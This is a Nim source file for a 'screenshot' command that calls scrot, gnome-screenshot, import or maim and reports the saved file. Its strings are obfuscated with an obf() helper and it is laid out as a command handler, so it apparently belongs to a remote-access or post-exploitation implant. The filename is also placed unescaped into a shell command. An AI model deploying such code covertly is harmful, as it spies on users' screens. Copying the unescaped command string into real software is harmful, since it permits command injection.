#[
    Cross-Platform screenshot Command
    Capture screenshots on Linux/Unix systems
    Uses system tools (scrot, gnome-screenshot, import, etc.)
]#

import osproc, strutils, os, times
import ../../util/strenc

proc screenshot*(args: seq[string]): string =
    try:
        let filename = if args.len >= 1: args[0] else: "screenshot_" & $now().toTime().toUnix() & ".png"
        
        when defined verbose:
            echo obf("DEBUG: Taking screenshot: ") & filename
        
        var screenshotTaken = false
        var screenshotTool = ""
        
        # Try different screenshot tools in order of preference
        let tools = [
            ("scrot", "scrot '" & filename & "'"),
            ("gnome-screenshot", "gnome-screenshot -f '" & filename & "'"),
            ("import", "import -window root '" & filename & "'"),
            ("maim", "maim '" & filename & "'")
        ]
        
        # Check which tool is available and use it
        for (tool, command) in tools:
            try:
                let checkResult = execProcess("which " & tool).strip()
                if checkResult.len > 0:
                    when defined verbose:
                        echo obf("DEBUG: Using screenshot tool: ") & tool
                    
                    let (_, exitCode) = execCmdEx(command)
                    
                    if exitCode == 0 and fileExists(filename):
                        screenshotTaken = true
                        screenshotTool = tool
                        break
            except:
                continue
        
        if not screenshotTaken:
            return obf("ERROR: No screenshot tool available.\nInstall one of: scrot, gnome-screenshot, maim, or ImageMagick")
        
        let fileSize = getFileSize(filename)
        
        when defined verbose:
            echo obf("DEBUG: Screenshot captured successfully, size: ") & $fileSize & obf(" bytes")
        
        var resultMsg = obf("Screenshot captured successfully:\n")
        resultMsg.add(obf("Tool: ") & screenshotTool & "\n")
        resultMsg.add(obf("File: ") & filename & "\n")
        resultMsg.add(obf("Size: ") & $fileSize & obf(" bytes"))
        
        return resultMsg
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: screenshot failed: ") & e.msg
        return obf("ERROR: Screenshot failed - ") & e.msg 